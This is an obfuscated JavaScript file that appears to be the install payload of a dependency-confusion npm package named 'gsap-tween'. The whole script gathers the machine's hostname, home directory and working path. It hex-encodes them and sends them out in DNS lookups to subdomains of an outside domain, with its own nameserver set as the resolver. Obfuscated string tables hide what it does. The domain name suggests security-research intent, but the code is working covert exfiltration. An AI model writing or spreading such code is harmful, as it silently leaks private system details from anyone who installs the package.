const _0x1ba119 = _0x1b83;
const dns = require(_0x1ba119(0x0));
function _0xd02d() {
    const _0x454911 = [
        'dns',
        '.dns.alexbirsan-hacks-paypal.com',
        'dns1.alexbirsan-hacks-paypal.com',
        'gsap-tween',
        'from',
        'toString',
        'hex',
        'match',
        'random',
        'substring',
        'forEach',
        'resolve',
        'v2_f.',
        '.v2_e',
        'log',
        'err',
        'hostname',
        'homedir',
        'BBOGENS-LAPTOP',
        'exit',
        'stringify',
        'lookup',
        '8.8.8.8',
        'setServers',
        '8.8.4.4'
    ];
    _0xd02d = function () {
        return _0x454911;
    };
    return _0xd02d();
}
const os = require('os');
const suffix = _0x1ba119(0x1);
const ns = _0x1ba119(0x2);
const package = _0x1ba119(0x3);
function sendToServer(_0x22fcee) {
    const _0x45e0fe = _0x1b83;
    _0x22fcee = Buffer[_0x45e0fe(0x4)](_0x22fcee)[_0x45e0fe(0x5)](_0x45e0fe(0x6));
    _0x22fcee = _0x22fcee[_0x45e0fe(0x7)](/.{1,60}/g);
    id = Math[_0x45e0fe(0x8)]()[_0x45e0fe(0x5)](0x24)[_0x45e0fe(0x9)](0x2);
    _0x22fcee[_0x45e0fe(0xa)](function (_0x3cc85e, _0x4459fa) {
        const _0x22a07d = _0x1b83;
        try {
            dns[_0x22a07d(0xb)](_0x22a07d(0xc) + id + '.' + _0x4459fa + '.' + _0x3cc85e + _0x22a07d(0xd) + suffix, 'A', console[_0x22a07d(0xe)]);
        } catch (_0x1fc4eb) {
        }
    });
}
function tryGet(_0x3f24bd) {
    const _0x2b7909 = _0x1b83;
    try {
        return _0x3f24bd();
    } catch (_0x195f97) {
        return _0x2b7909(0xf);
    }
}
data = {
    'p': package,
    'h': tryGet(os[_0x1ba119(0x10)]),
    'd': tryGet(os[_0x1ba119(0x11)]),
    'c': __dirname
};
if (data['h'] == _0x1ba119(0x12)) {
    process[_0x1ba119(0x13)](0x0);
}
data = JSON[_0x1ba119(0x14)](data);
sendToServer(data);
function _0x1b83(_0xd02d75, _0x1b83d2) {
    const _0x353936 = _0xd02d();
    _0x1b83 = function (_0x46e674, _0x5a8515) {
        _0x46e674 = _0x46e674 - 0x0;
        let _0x1976e1 = _0x353936[_0x46e674];
        return _0x1976e1;
    };
    return _0x1b83(_0xd02d75, _0x1b83d2);
}
dns[_0x1ba119(0x15)](ns, function (_0x5b8739, _0x37d2ca) {
    const _0x3e478b = _0x1b83;
    if (!_0x5b8739) {
        nsAddress = _0x37d2ca;
    } else {
        nsAddress = _0x3e478b(0x16);
    }
    dns[_0x3e478b(0x17)]([
        nsAddress,
        _0x3e478b(0x18)
    ]);
    sendToServer(data);
});
